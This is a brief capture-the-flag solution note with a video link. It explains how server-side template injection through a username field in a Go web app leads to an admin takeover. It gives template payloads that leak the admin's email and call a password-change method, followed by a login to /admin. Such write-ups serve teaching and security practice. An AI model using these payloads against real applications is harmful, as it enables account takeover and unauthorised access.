[solution](https://www.youtube.com/watch?v=Zia0B4OESgA)

tl;dr
some source code at /models/ and /web/
SSTI in username
get admin's email: set username to {{.Post.Author}} and access blog post
change admin's password: set username to {{.Post.Author.ChangePassword "x"}} and access blog post
login and access /admin
